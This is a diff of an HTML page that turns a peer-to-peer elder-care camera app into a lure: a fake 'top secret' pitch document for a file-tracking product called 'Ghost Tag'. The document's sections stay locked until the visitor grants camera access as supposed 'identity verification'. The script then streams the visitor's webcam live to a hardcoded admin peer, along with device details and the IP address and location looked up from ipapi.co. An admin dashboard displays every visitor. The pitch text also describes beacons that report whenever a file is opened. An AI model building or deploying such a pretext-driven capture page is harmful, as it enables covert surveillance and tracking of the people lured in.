 <body>
 
-<!-- BACK BUTTON -->
-<button class="back-btn" id="backBtn" onclick="goHome()">← Home</button>
+<!-- Classification bar -->
+<div class="classbar">
+  <div class="classbar-dot"></div>
+  <span>TOP SECRET · RESTRICTED · AUTHORIZED ACCESS ONLY</span>
+  <div class="classbar-dot"></div>
+  <span>CONFAI INTELLIGENCE PORTAL · v1.0</span>
+  <div class="classbar-dot"></div>
+</div>
 
-<!-- TOAST -->
+<!-- Nav -->
+<nav class="nav">
+  <div class="nav-brand">
+    <div class="nav-brand-dot"></div>
+    CONFAI
+  </div>
+  <div class="nav-meta">
+    <div class="nav-status">
+      <div class="status-dot" id="navStatusDot"></div>
+      <span id="navStatusText">INITIALIZING</span>
+    </div>
+    <span id="navDateTime" style="color:var(--text3)"></span>
+  </div>
+</nav>
+
+<!-- Self cam (viewer, hidden small corner) -->
+<div id="selfCam"><video id="selfCamVideo" autoplay muted playsinline></video></div>
+
+<!-- Toast -->
 <div class="toast" id="toast"></div>
 
-<!-- ═══ SCREEN: HOME ═══ -->
-<div class="screen active fade-in" id="screen-home">
-  <div class="logo-wrap">
-    <div class="logo-icon">
-      <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
-    </div>
-    <h1 class="brand">Care<span>Watch</span></h1>
-    <p class="tagline">Always Near · Always Ready</p>
+<!-- Fullscreen overlay (admin) -->
+<div class="fullscreen-overlay" id="fsOverlay">
+  <div class="fs-topbar">
+    <div class="fs-label" id="fsLabel">ACCESS1</div>
+    <button class="fs-close" onclick="closeFullscreen()">✕ Close</button>
   </div>
-
-  <div class="home-cards">
-    <div class="role-card" onclick="startHost()">
-      <div class="role-icon orange">📱</div>
-      <h3>Setup Camera</h3>
-      <p>Place this on the device near your loved one. Streams live video securely.</p>
-      <div class="arrow">→</div>
+  <div class="fs-main">
+    <div class="fs-video-wrap">
+      <video id="fsVideo" autoplay playsinline></video>
     </div>
-    <div class="role-card" onclick="startViewer()">
-      <div class="role-icon green">🖥️</div>
-      <h3>View Camera</h3>
-      <p>Connect from your desktop or phone to watch the live feed anytime.</p>
-      <div class="arrow">→</div>
-    </div>
-  </div>
-
-  <p class="home-note">🔒 Peer-to-peer encrypted — video streams directly between devices, never stored on any server.</p>
-</div>
-
-<!-- ═══ SCREEN: HOST ═══ -->
-<div class="screen" id="screen-host">
-  <div class="host-header fade-in">
-    <h2>📱 Camera Setup</h2>
-    <p>Share the code below with your caregiver so they can view this camera</p>
-  </div>
-
-  <div class="host-layout fade-in">
-    <!-- VIDEO -->
-    <div class="video-box" id="hostVideoBox">
-      <div class="cam-placeholder" id="camPlaceholder">
-        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M17 10.5V7a1 1 0 00-1-1H4a1 1 0 00-1 1v10a1 1 0 001 1h12a1 1 0 001-1v-3.5l4 4v-11l-4 4z"/></svg>
-        <p>Starting camera…</p>
-      </div>
-      <video id="localVideo" autoplay muted playsinline></video>
-      <div class="live-badge" id="liveBadge">
-        <div class="live-dot"></div> LIVE
-      </div>
-      <div class="viewer-count-badge" id="viewerCountBadge">👁 <span id="viewerCount">0</span> watching</div>
-    </div>
-
-    <!-- SIDEBAR -->
-    <div class="host-sidebar">
-      <div class="info-card">
-        <label>Your Session Code</label>
-        <div class="session-id-display" id="hostCode">—</div>
-        <div style="height:10px"></div>
-        <button class="btn btn-amber" id="copyCodeBtn" onclick="copyCode()" disabled>📋 Copy Code</button>
-      </div>
-
-      <div class="info-card">
-        <label>Shareable Viewer Link</label>
-        <div class="share-url-box" id="shareUrl">Generating link…</div>
-        <button class="btn btn-amber" id="copyLinkBtn" onclick="copyLink()" disabled>🔗 Copy Link</button>
-      </div>
-
-      <div class="info-card">
-        <label>Connection Status</label>
-        <div class="status-row">
-          <div class="status-dot amber" id="hostStatusDot"></div>
-          <span id="hostStatusText">Starting…</span>
-        </div>
-      </div>
-
-      <div class="host-tip">
-        💡 Keep this tab open in the background. The camera will stay active. Your caregiver can connect at any time using the code.
-      </div>
+    <div class="fs-sidebar">
+      <h4>DEVICE INTELLIGENCE</h4>
+      <div id="fsSidebarContent"></div>
     </div>
   </div>
 </div>
 
-<!-- ═══ SCREEN: VIEWER ═══ -->
-<div class="screen" id="screen-viewer">
-  <div class="viewer-header fade-in">
-    <h2>🖥️ Live View</h2>
-    <p>Enter the session code from the camera device to connect</p>
+<!-- ════════════════════════════════════════
+     VIEWER PAGE
+════════════════════════════════════════ -->
+<div class="page" id="viewer-page">
+
+  <!-- Doc Hero -->
+  <div class="doc-hero fade-up">
+    <div class="doc-classification">TOP SECRET // CONFIDENTIAL // NF</div>
+    <div class="doc-title">Ghost Tag<br><span style="font-style:italic;font-weight:400;font-size:0.65em;color:var(--text2)">From Concept to Launch</span></div>
+    <div class="doc-subtitle">"You never know you are being traced."</div>
+    <div class="doc-meta-row">
+      <div class="doc-meta-item"><span>VERSION</span><span>1.0 · 2025</span></div>
+      <div class="doc-meta-item"><span>CLASSIFICATION</span><span style="color:var(--red)">CONFIDENTIAL</span></div>
+      <div class="doc-meta-item"><span>TOPICS</span><span>Concepts · Theory · Methodology · Architecture · FAQs · Investment</span></div>
+      <div class="doc-meta-item"><span>DISTRIBUTION</span><span>Authorized Recipients Only</span></div>
+    </div>
   </div>
 
-  <div class="viewer-layout fade-in">
-    <!-- VIDEO -->
-    <div class="video-box" id="viewerVideoBox">
-      <video id="remoteVideo" autoplay playsinline></video>
+  <!-- Doc Content -->
+  <div class="doc-content">
 
-      <!-- Connect overlay -->
-      <div class="connect-overlay" id="connectOverlay">
-        <div id="overlayContent">
-          <div style="text-align:center; color:white">
-            <div style="font-size:2.5rem; margin-bottom:16px">📡</div>
-            <p style="font-size:0.9rem; opacity:0.8; margin-bottom:20px">Enter the code shown on grandma's device</p>
-            <div class="connect-form" style="max-width:260px; margin:0 auto">
-              <input class="code-input" id="codeInput" maxlength="6" placeholder="ABC123" oninput="this.value=this.value.toUpperCase()"/>
-              <button class="btn btn-amber" onclick="connectToHost()" id="connectBtn">Connect →</button>
-            </div>
+    <!-- Granted bar -->
+    <div class="access-granted-bar" id="grantedBar">
+      <div class="status-dot live"></div>
+      <span>ACCESS GRANTED · Camera verification active · Your device has been logged for transparency</span>
+    </div>
+
+    <!-- SECTION 0: Executive Summary (always visible) -->
+    <div class="doc-section visible" id="sec0">
+      <div class="section-header">
+        <div class="section-num">EXECUTIVE SUMMARY</div>
+        <div class="section-title">Overview</div>
+      </div>
+      <div class="doc-p">
+        <strong>Ghost Tag</strong> is a confidential file tracking and intelligence platform that enables asset owners to maintain live awareness of every copy of their digital assets — across any recipient, device, and jurisdiction — even after the original file has been deleted.
+      </div>
+      <div class="doc-p">
+        Built on a combination of proven steganographic techniques and two original architectural innovations, Ghost Tag operates invisibly inside files distributed via any channel: email, WhatsApp, Google Drive, USB transfer, or any other medium.
+      </div>
+      <div class="doc-highlight">
+        <strong>"Post-Deletion Presence"</strong> — Ghost Tag introduces a genuinely new concept in information security: a digital asset that outlives its creator's copy and continues to report its location and access status in real time.
+      </div>
+    </div>
+
+    <!-- ACCESS GATE -->
+    <div class="access-gate" id="accessGate">
+      <!-- Blurred preview of next section -->
+      <div class="gate-blur">
+        <div class="doc-section visible" style="opacity:0.25">
+          <div class="section-header">
+            <div class="section-num">01</div>
+            <div class="section-title">Where to Start — The Setup Order</div>
           </div>
+          <div class="doc-p">Before writing a single line of code, Ghost Tag needs three parallel foundations to be established: legal, technical, and commercial. Getting these in the right order prevents wasted effort and protects the company from day one.</div>
+          <div class="doc-p">The First 30 Days — Register the Company. Incorporate a private limited company or LLC. Secure the Intellectual Property. File a provisional patent for the core Ghost Tag mechanism — specifically the combination of pixel watermarking + consent beacon + share chain tree...</div>
         </div>
       </div>
 
-      <button class="fullscreen-btn" onclick="toggleFullscreen()" title="Fullscreen">
-        <svg width="16" height="16" fill="white" viewBox="0 0 24 24"><path d="M7 14H5v5h5v-2H7v-3zm-2-4h2V7h3V5H5v5zm12 7h-3v2h5v-5h-2v3zM14 5v2h3v3h2V5h-5z"/></svg>
-      </button>
-
-      <div class="live-badge" id="viewerLiveBadge">
-        <div class="live-dot"></div> LIVE
+      <!-- Gate lock UI -->
+      <div class="gate-lock">
+        <div class="gate-icon">🔐</div>
+        <h3>Secure Access Required</h3>
+        <p>This document is classified. To access the full intelligence report — including architecture diagrams, methodology, FAQs, and the investment case — identity verification is required.</p>
+        <div class="gate-notice">
+          ⚠ TRANSPARENCY NOTICE: By proceeding, you consent to camera access for identity verification. Your device information (browser, OS, timezone, screen resolution, IP address) will be logged. This is disclosed in accordance with data transparency policy.
+        </div>
+        <button class="btn-access" id="accessBtn" onclick="requestAccess()">
+          <span id="accessBtnText">🔓 AUTHENTICATE & ACCESS</span>
+        </button>
       </div>
     </div>
 
-    <!-- SIDEBAR -->
-    <div class="viewer-sidebar">
-      <div class="metric-card">
-        <label>Connection</label>
-        <div class="status-row" style="margin-top:4px">
-          <div class="status-dot" id="viewerStatusDot"></div>
-          <span id="viewerStatusText" style="font-size:0.85rem">Not connected</span>
-        </div>
+    <!-- LOCKED SECTIONS (shown after access granted) -->
+
+    <div class="doc-section locked" id="sec1">
+      <div class="section-header">
+        <div class="section-num">01</div>
+        <div class="section-title">Where to Start — The Setup Order</div>
       </div>
+      <div class="doc-p">Before writing a single line of code, Ghost Tag needs three parallel foundations to be established: <strong>legal, technical, and commercial</strong>. Getting these in the right order prevents wasted effort and protects the company from day one.</div>
 
-      <div class="metric-card">
-        <label>Connected Since</label>
-        <div class="metric-value" id="connectedSince">—</div>
+      <div class="doc-p"><strong>1.1 The First 30 Days</strong></div>
+      <div class="doc-p">Register the Company as a private limited company or LLC in a jurisdiction with strong IP protection — India, Singapore, UK, or Delaware USA. File a provisional patent for the core Ghost Tag mechanism — specifically the combination of <strong>pixel watermarking + consent beacon + share chain tree</strong>. Also register the trademark 'Ghost Tag' in primary markets.</div>
+      <div class="doc-p">Draft the Legal Framework with a data privacy lawyer: the Data Collection Agreement, the Privacy Policy, and the Terms of Service — compliant with GDPR, CCPA, and PDPA before a single beta user touches the product.</div>
+
+      <div class="doc-p"><strong>1.2 Days 30–90 — Proof of Concept</strong></div>
+      <div class="doc-p">Set up the core backend: Node.js API server, PostgreSQL database, beacon endpoint. Host on AWS or Azure. Build the simplest possible beacon: a 1-pixel transparent PNG embedded in a PDF that calls your server when the PDF is opened. Build a minimal dashboard: one table showing file ID, opener's IP, location, and timestamp.</div>
+
+      <div class="doc-p"><strong>1.3 Days 90–180 — MVP Build</strong></div>
+      <div class="doc-p">Extend beacon to all file types: PDF, DOCX, MP4, JPG, PNG, MOV. Build the consent wrapper shell. Integrate a pixel watermarking library (Digimarc API or Imatag). Build the share chain tree. Add real-time alerts. Pilot with two to three friendly companies at no cost.</div>
+    </div>
+
+    <div class="doc-section locked" id="sec2">
+      <div class="section-header">
+        <div class="section-num">02</div>
+        <div class="section-title">Concepts & Theories</div>
       </div>
-
-      <div class="metric-card">
-        <label>Session Code</label>
-        <div style="font-family:monospace; font-size:1.4rem; font-weight:600; color:var(--amber-dark); letter-spacing:0.15em" id="connectedCode">—</div>
+      <div class="doc-p">Ghost Tag is built on a foundation of well-proven technologies — plus one genuinely new conceptual contribution.</div>
+      <div class="tag-grid">
+        <div class="tag-item"><div class="tag-label">FOUNDATION 01</div><div class="tag-val">Digital Steganography (LSB + Spread Spectrum) — proven since 1992</div></div>
+        <div class="tag-item"><div class="tag-label">FOUNDATION 02</div><div class="tag-val">Robust Digital Watermarking — proven since 1994</div></div>
+        <div class="tag-item"><div class="tag-label">FOUNDATION 03</div><div class="tag-val">Web Beacon / Tracking Pixel — proven since 1998</div></div>
+        <div class="tag-item"><div class="tag-label">FOUNDATION 04</div><div class="tag-val">Device Fingerprinting — web security since 2010</div></div>
+        <div class="tag-item"><div class="tag-label">FOUNDATION 05</div><div class="tag-val">GDPR Consent Model — Ghost Tag embeds it inside the file</div></div>
+        <div class="tag-item"><div class="tag-label">FOUNDATION 06</div><div class="tag-val">Directed Acyclic Graph for share chain (Graph Theory)</div></div>
+        <div class="tag-item" style="border-color:rgba(99,102,241,0.3);background:rgba(99,102,241,0.06)"><div class="tag-label" style="color:var(--accent2)">★ ORIGINAL</div><div class="tag-val" style="color:var(--text)">Post-Deletion Presence — no prior art</div></div>
+        <div class="tag-item" style="border-color:rgba(99,102,241,0.3);background:rgba(99,102,241,0.06)"><div class="tag-label" style="color:var(--accent2)">★ ORIGINAL</div><div class="tag-val" style="color:var(--text)">Consent-Embedded File Architecture — no prior art</div></div>
       </div>
+    </div>
 
-      <button class="btn btn-outline" id="disconnectBtn" onclick="disconnect()" style="display:none">⏹ Disconnect</button>
+    <div class="doc-section locked" id="sec3">
+      <div class="section-header">
+        <div class="section-num">03</div>
+        <div class="section-title">Methodology</div>
+      </div>
+      <div class="doc-p">Ghost Tag's methodology is the specific process by which a file is tagged, distributed, tracked, and reported.</div>
+      <table class="doc-table">
+        <thead><tr><th>STAGE</th><th>ACTION</th><th>OUTPUT</th></tr></thead>
+        <tbody>
+          <tr><td>Asset Registration</td><td>Owner uploads file to Ghost Tag platform</td><td>UUID generated, stored in database</td></tr>
+          <tr><td>Watermark Injection</td><td>Steganographic marker embedded in pixel/frame data</td><td>Modified file with invisible UUID in content layer</td></tr>
+          <tr><td>Beacon Injection</td><td>Tracking script added to file metadata / container</td><td>File calls Ghost Tag server on every new-device open</td></tr>
+          <tr><td>Consent Wrapping</td><td>File packaged inside consent shell</td><td>Self-contained file with embedded legal disclosure</td></tr>
+          <tr><td>Distribution</td><td>Owner shares wrapped file via any channel</td><td>Beacon dormant until first open on new device</td></tr>
+        </tbody>
+      </table>
+      <div class="doc-p" style="margin-top:16px"><strong>Event Capture:</strong> When a recipient opens the file and accepts the consent screen, the following data capture sequence executes in under 500 milliseconds: beacon fires → IP resolved via GeoIP → device fingerprint generated → share chain updated → real-time alert pushed to owner dashboard.</div>
+    </div>
 
-      <div class="how-it-works">
-        <h4>How to use</h4>
-        <div class="how-step"><div class="how-num">1</div><span>Open CareWatch on your loved one's device and tap "Setup Camera"</span></div>
-        <div class="how-step"><div class="how-num">2</div><span>Note the 6-letter session code shown on that device</span></div>
-        <div class="how-step"><div class="how-num">3</div><span>Enter the code here and tap Connect to see the live feed</span></div>
+    <div class="doc-section locked" id="sec4">
+      <div class="section-header">
+        <div class="section-num">04</div>
+        <div class="section-title">System Architecture</div>
+      </div>
+      <table class="doc-table">
+        <thead><tr><th>LAYER</th><th>COMPONENTS</th><th>TECHNOLOGY</th></tr></thead>
+        <tbody>
+          <tr><td>File Layer</td><td>UUID, pixel watermark, metadata beacon, consent wrapper</td><td>Steganography lib, Electron, EXIF/ID3</td></tr>
+          <tr><td>Ingestion Layer</td><td>Beacon endpoint, IP resolver, device fingerprinter</td><td>Node.js API, MaxMind GeoIP, FingerprintJS</td></tr>
+          <tr><td>Processing Layer</td><td>Share chain engine, event logger, alert engine</td><td>PostgreSQL + Neo4j, Redis</td></tr>
+          <tr><td>Presentation Layer</td><td>Owner dashboard, share tree visualiser, world map</td><td>React, Mapbox GL, D3.js, WebSocket</td></tr>
+          <tr><td>Security Layer</td><td>Encryption, access control, audit log, SOC2</td><td>TLS 1.3, AES-256, AWS KMS, S3 WORM</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="doc-section locked" id="sec5">
+      <div class="section-header">
+        <div class="section-num">05</div>
+        <div class="section-title">Investment Case</div>
+      </div>
+      <div class="doc-p">Ghost Tag addresses a gap in the <strong>$12.5B data loss prevention market</strong> that no current vendor fills: tracking not at the network or device level, but at the individual file level, across any channel, post-distribution.</div>
+      <div class="doc-highlight">
+        <strong>The fundamental insight:</strong> Files leave controlled environments the moment they are shared. Every existing DRM system tries to prevent this. Ghost Tag accepts it as inevitable and instead makes every shared copy a live intelligence asset.
+      </div>
+      <div class="tag-grid">
+        <div class="tag-item"><div class="tag-label">TARGET MARKET</div><div class="tag-val">Law firms, media companies, financial institutions, government contractors</div></div>
+        <div class="tag-item"><div class="tag-label">REVENUE MODEL</div><div class="tag-val">SaaS per-seat + enterprise volume licensing + forensic recovery services</div></div>
+        <div class="tag-item"><div class="tag-label">MOAT</div><div class="tag-val">Two original patentable concepts + first-mover in consent-embedded file tracking</div></div>
+        <div class="tag-item"><div class="tag-label">SEED REQUIREMENT</div><div class="tag-val">$500K–$1.5M for 18-month runway to Series A readiness</div></div>
+      </div>
+    </div>
+
+    <div class="doc-section locked" id="sec6" style="border-top:1px solid var(--border);padding-top:32px;margin-top:32px">
+      <div class="doc-classification" style="font-family:'IBM Plex Mono',monospace;font-size:0.6rem;font-weight:600;letter-spacing:0.25em;color:var(--text3);margin-bottom:0;display:flex;align-items:center;gap:10px;border:none">
+        <span style="flex:1;height:1px;background:var(--border);display:block"></span>
+        END OF DOCUMENT · TOP SECRET · CONFAI INTELLIGENCE PORTAL · UNAUTHORIZED DISTRIBUTION PROHIBITED
+        <span style="flex:1;height:1px;background:var(--border);display:block"></span>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     ADMIN PAGE
+════════════════════════════════════════ -->
+<div class="page" id="admin-page">
+  <div class="admin-header fade-up">
+    <div class="admin-header-left">
+      <h2>Admin Dashboard</h2>
+      <p>Live viewer intelligence · Camera feeds · Device logs</p>
+    </div>
+    <div class="admin-stats">
+      <div class="stat-card"><div class="stat-label">CONNECTED</div><div class="stat-value" id="statConnected">0</div></div>
+      <div class="stat-card"><div class="stat-label">TOTAL SEEN</div><div class="stat-value" id="statTotal">0</div></div>
+      <div class="stat-card"><div class="stat-label">SESSION</div><div class="stat-value" id="statUptime">00:00</div></div>
+    </div>
+  </div>
+
+  <div class="admin-grid-wrap">
+    <div class="admin-grid-label">CONNECTED VIEWERS</div>
+    <div class="admin-grid" id="adminGrid">
+      <div class="admin-waiting" id="adminWaiting">
+        <div class="wait-icon">📡</div>
+        <p>Admin peer active · Waiting for viewers to connect<br><br>
+        Share this link with viewers:<br>
+        <span class="share-link" id="adminShareLink">—</span>
+        </p>
       </div>
     </div>
   </div>
 </div>
 
 <script>
-// ── STATE ──
-let peer = null;
+// ══════════════════════════════════════════
+// SHARED STATE
+// ══════════════════════════════════════════
+const isAdmin = window.location.search.includes('admin');
+const ADMIN_PEER_ID = 'confai-admin-ochre-v2';
+let viewerCount = 0, totalCount = 0, adminStartTime = null;
+let viewers = {}; // peerId → { call, conn, info, label, stream }
 let localStream = null;
-let activeConnections = [];
-let viewerPeer = null;
-let connectedCall = null;
-let sessionCode = '';
-let connectedAt = null;
-let clockTimer = null;
 
-// ── NAVIGATION ──
-function showScreen(id) {
-  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-  document.getElementById('screen-' + id).classList.add('active');
-  document.getElementById('backBtn').classList.toggle('show', id !== 'home');
+// Clock
+function updateClock() {
+  const now = new Date();
+  const pad = n => String(n).padStart(2,'0');
+  document.getElementById('navDateTime').textContent =
+    `${now.getFullYear()}-${pad(now.getMonth()+1)}-${pad(now.getDate())} · ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
+  if (adminStartTime) {
+    const secs = Math.floor((Date.now() - adminStartTime) / 1000);
+    document.getElementById('statUptime').textContent =
+      `${pad(Math.floor(secs/60))}:${pad(secs%60)}`;
+  }
+}
+setInterval(updateClock, 1000); updateClock();
+
+function toast(msg, dur=2500) {
+  const t = document.getElementById('toast');
+  t.textContent = msg; t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), dur);
 }
 
-function goHome() {
-  cleanup();
-  showScreen('home');
+function setNavStatus(dot, txt) {
+  const d = document.getElementById('navStatusDot');
+  d.className = 'status-dot' + (dot === 'live' ? ' live' : '');
+  document.getElementById('navStatusText').textContent = txt;
 }
 
-function cleanup() {
-  if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
-  if (peer) { peer.destroy(); peer = null; }
-  if (clockTimer) { clearInterval(clockTimer); clockTimer = null; }
-  activeConnections = [];
+// ══════════════════════════════════════════
+// VIEWER MODE
+// ══════════════════════════════════════════
+async function initViewer() {
+  document.getElementById('viewer-page').classList.add('active');
+  setNavStatus('', 'DOCUMENT LOADED');
+
+  // Make visible sections animate in
+  document.querySelectorAll('.doc-section.visible').forEach((el,i) => {
+    el.style.animationDelay = (i * 0.1) + 's';
+  });
 }
 
-// ── GENERATE CODE ──
-function genCode() {
-  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
-  return Array.from({length:6}, () => chars[Math.floor(Math.random()*chars.length)]).join('');
-}
+async function requestAccess() {
+  const btn = document.getElementById('accessBtn');
+  const btnTxt = document.getElementById('accessBtnText');
+  btn.disabled = true;
+  btnTxt.innerHTML = '<span class="spin"></span> VERIFYING…';
 
-// ── HOST FLOW ──
-async function startHost() {
-  showScreen('host');
-
-  // Get camera
   try {
-    localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width:{ideal:1280}, height:{ideal:720} }, audio: true });
-    const vid = document.getElementById('localVideo');
-    vid.srcObject = localStream;
-    document.getElementById('camPlaceholder').style.display = 'none';
+    // 1. Request camera
+    localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+
+    // 2. Show self-cam (tiny, unobtrusive)
+    const selfCam = document.getElementById('selfCam');
+    const selfVid = document.getElementById('selfCamVideo');
+    selfVid.srcObject = localStream;
+    selfCam.style.display = 'block';
+
+    // 3. Capture device info
+    btnTxt.innerHTML = '<span class="spin"></span> LOGGING DEVICE…';
+    const devInfo = await captureDeviceInfo();
+
+    // 4. Connect to admin via PeerJS
+    btnTxt.innerHTML = '<span class="spin"></span> ESTABLISHING SECURE CHANNEL…';
+    await connectToAdmin(devInfo);
+
+    // 5. Unlock document
+    unlockDocument();
+    setNavStatus('live', 'ACCESS GRANTED · LIVE');
+
   } catch(e) {
-    // Try front camera
-    try {
-      localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-      document.getElementById('localVideo').srcObject = localStream;
-      document.getElementById('camPlaceholder').style.display = 'none';
-    } catch(e2) {
-      showStatus('host', 'red', 'Camera access denied');
-      toast('Please allow camera access and refresh');
-      return;
+    console.warn('Access error:', e);
+    if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
+      btnTxt.textContent = '⚠ Camera required — try again';
+      btn.disabled = false;
+      toast('Camera permission is required to access this document');
+    } else {
+      // Still unlock if camera granted but peer failed
+      if (localStream) {
+        unlockDocument();
+        setNavStatus('live', 'ACCESS GRANTED');
+      } else {
+        btnTxt.textContent = '⚠ Error — try again';
+        btn.disabled = false;
+      }
     }
   }
+}
 
-  // Create PeerJS
-  sessionCode = genCode();
-  document.getElementById('hostCode').textContent = sessionCode;
+async function captureDeviceInfo() {
+  const info = {
+    browser: getBrowser(),
+    os: getOS(),
+    screen: `${screen.width}×${screen.height}`,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    language: navigator.language,
+    platform: navigator.platform,
+    timestamp: new Date().toISOString(),
+    ip: '—',
+    city: '—'
+  };
+  try {
+    const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(3000) });
+    const d = await r.json();
+    info.ip = d.ip || '—';
+    info.city = (d.city ? d.city + ', ' : '') + (d.country_name || '—');
+  } catch(e) {
+    try {
+      const r2 = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(3000) });
+      const d2 = await r2.json();
+      info.ip = d2.ip || '—';
+    } catch(e2) {}
+  }
+  return info;
+}
 
-  const viewLink = window.location.href.split('?')[0] + '?view=' + sessionCode;
-  document.getElementById('shareUrl').textContent = viewLink;
-  document.getElementById('copyLinkBtn').disabled = false;
-  document.getElementById('copyCodeBtn').disabled = false;
+function getBrowser() {
+  const ua = navigator.userAgent;
+  if (ua.includes('Edg')) return 'Edge';
+  if (ua.includes('Chrome')) return 'Chrome';
+  if (ua.includes('Firefox')) return 'Firefox';
+  if (ua.includes('Safari')) return 'Safari';
+  if (ua.includes('Opera')) return 'Opera';
+  return 'Unknown';
+}
+function getOS() {
+  const ua = navigator.userAgent;
+  if (ua.includes('Windows')) return 'Windows';
+  if (ua.includes('Mac')) return 'macOS';
+  if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+  if (ua.includes('Android')) return 'Android';
+  if (ua.includes('Linux')) return 'Linux';
+  return 'Unknown';
+}
 
-  showStatus('host', 'amber', 'Connecting to relay…');
+function connectToAdmin(devInfo) {
+  return new Promise((resolve) => {
+    const vPeer = new Peer({
+      debug: 0,
+      config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }] }
+    });
 
-  peer = new Peer(sessionCode, {
+    const timeout = setTimeout(resolve, 8000); // timeout → still unlock
+
+    vPeer.on('open', () => {
+      // Call admin with video
+      const call = vPeer.call(ADMIN_PEER_ID, localStream);
+      call.on('error', () => { clearTimeout(timeout); resolve(); });
+
+      // Send device info via data channel
+      try {
+        const conn = vPeer.connect(ADMIN_PEER_ID);
+        conn.on('open', () => {
+          conn.send({ type: 'device-info', data: devInfo });
+          clearTimeout(timeout);
+          resolve();
+        });
+        conn.on('error', () => { clearTimeout(timeout); resolve(); });
+      } catch(e) { clearTimeout(timeout); resolve(); }
+    });
+
+    vPeer.on('error', () => { clearTimeout(timeout); resolve(); });
+  });
+}
+
+function unlockDocument() {
+  // Hide gate
+  document.getElementById('accessGate').style.display = 'none';
+  document.getElementById('grantedBar').classList.add('show');
+
+  // Unlock sections with stagger
+  const locked = document.querySelectorAll('.doc-section.locked');
+  locked.forEach((sec, i) => {
+    setTimeout(() => {
+      sec.classList.remove('locked');
+      sec.classList.add('visible');
+    }, i * 180);
+  });
+
+  toast('✓ Full document unlocked');
+}
+
+// ══════════════════════════════════════════
+// ADMIN MODE
+// ══════════════════════════════════════════
+function initAdmin() {
+  document.getElementById('admin-page').classList.add('active');
+  document.getElementById('adminShareLink').textContent = window.location.origin + window.location.pathname;
+  setNavStatus('', 'ADMIN · CONNECTING…');
+  adminStartTime = Date.now();
+
+  const adminPeer = new Peer(ADMIN_PEER_ID, {
     debug: 0,
-    config: {
-      iceServers: [
-        { urls: 'stun:stun.l.google.com:19302' },
-        { urls: 'stun:stun1.l.google.com:19302' }
-      ]
-    }
+    config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }] }
   });
 
-  peer.on('open', id => {
-    showStatus('host', 'green', 'Ready — waiting for viewer');
+  adminPeer.on('open', id => {
+    setNavStatus('live', 'ADMIN · LIVE');
+    toast('Admin peer active · Waiting for viewers…');
   });
 
-  peer.on('call', call => {
-    call.answer(localStream);
-    activeConnections.push(call);
-    updateViewerCount();
-    document.getElementById('liveBadge').classList.add('show');
-    showStatus('host', 'green', 'Caregiver is watching ✓');
+  adminPeer.on('call', call => {
+    const peerId = call.peer;
+    call.answer(); // Accept call, don't send video back
+
+    call.on('stream', stream => {
+      if (!viewers[peerId]) initViewerSlot(peerId);
+      viewers[peerId].stream = stream;
+      viewers[peerId].call = call;
+      attachStream(peerId, stream);
+      viewerCount++;
+      totalCount++;
+      updateAdminStats();
+      document.getElementById('adminWaiting').style.display = 'none';
+    });
 
     call.on('close', () => {
-      activeConnections = activeConnections.filter(c => c !== call);
-      updateViewerCount();
-      if (activeConnections.length === 0) {
-        document.getElementById('liveBadge').classList.remove('show');
-        showStatus('host', 'green', 'Ready — waiting for viewer');
+      removeViewer(peerId);
+    });
+    call.on('error', () => removeViewer(peerId));
+  });
+
+  adminPeer.on('connection', conn => {
+    const peerId = conn.peer;
+    conn.on('data', data => {
+      if (data.type === 'device-info') {
+        if (!viewers[peerId]) initViewerSlot(peerId);
+        viewers[peerId].info = data.data;
+        updateViewerCard(peerId, data.data);
       }
     });
-    call.on('error', () => {
-      activeConnections = activeConnections.filter(c => c !== call);
-      updateViewerCount();
-    });
   });
 
-  peer.on('error', e => {
+  adminPeer.on('error', e => {
     if (e.type === 'unavailable-id') {
-      sessionCode = genCode();
-      document.getElementById('hostCode').textContent = sessionCode;
-      peer.destroy();
-      startHost();
+      setNavStatus('', 'ADMIN · ID TAKEN · Another admin session is running');
+      toast('⚠ Admin ID in use — close other admin session');
     } else {
-      showStatus('host', 'red', 'Connection error: ' + e.type);
+      setNavStatus('', 'ADMIN · ERROR: ' + e.type);
     }
   });
 }
 
-function updateViewerCount() {
-  const n = activeConnections.length;
-  const badge = document.getElementById('viewerCountBadge');
-  document.getElementById('viewerCount').textContent = n;
-  badge.classList.toggle('show', n > 0);
+let accessCounter = 0;
+function initViewerSlot(peerId) {
+  accessCounter++;
+  const label = 'ACCESS' + accessCounter;
+  viewers[peerId] = { label, stream: null, call: null, info: null, connectedAt: new Date() };
+
+  const card = document.createElement('div');
+  card.className = 'viewer-card fade-up';
+  card.id = 'card-' + peerId.replace(/[^a-z0-9]/gi,'_');
+  card.onclick = () => openFullscreen(peerId);
+  card.innerHTML = `
+    <div class="card-feed" id="feed-${peerId.replace(/[^a-z0-9]/gi,'_')}">
+      <div class="card-feed-offline"><div class="feed-icon">📡</div><span>Awaiting stream…</span></div>
+      <div class="card-live-badge" id="live-${peerId.replace(/[^a-z0-9]/gi,'_')}"><div class="card-live-dot"></div>LIVE</div>
+    </div>
+    <div class="card-body">
+      <div class="card-access-label">
+        <span>${label}</span>
